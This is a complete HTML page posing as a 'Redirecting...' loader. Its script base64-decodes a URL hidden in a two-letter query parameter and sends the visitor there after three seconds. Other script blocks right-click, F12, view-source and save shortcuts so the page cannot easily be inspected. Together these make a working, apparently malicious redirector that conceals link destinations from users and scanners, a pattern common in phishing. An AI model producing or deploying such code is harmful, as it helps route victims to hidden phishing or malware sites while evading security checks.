<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    img.loader {
      width: 150px;
      height: auto;
    }
  </style>
  <script>
    // Disable right-click and common inspect shortcuts
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.onkeydown = function(e) {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
        (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85 || e.keyCode === 65)) // Ctrl+S/U/A
      ) {
        return false;
      }
    };
  </script>
  <script>
    window.onload = function () {
      const params = new URLSearchParams(window.location.search);
      let encodedValue = '';

      for (const [key, value] of params.entries()) {
        if (key.length === 2) {
          encodedValue = value;
          break;
        }
      }

      if (encodedValue) {
        try {
          const decodedURL = atob(encodedValue); // Base64 decode
          let finalURL = decodedURL;
          if (!/^https?:\/\//i.test(finalURL)) {
            finalURL = 'http://' + finalURL;
          }
          // Redirect after 3 seconds
          setTimeout(() => {
            window.location.href = finalURL;
          }, 3000);
        } catch (e) {
          window.location.href = 'about:blank';
        }
      } else {
        window.location.href = 'about:blank';
      }
    };
  </script>
</head>
<body>
  <img src="https://cdn.dribbble.com/userupload/20679886/file/original-88dc160ca9b545e262ac340d2425afba.gif" alt="Loading..." class="loader">
</body>
</html>
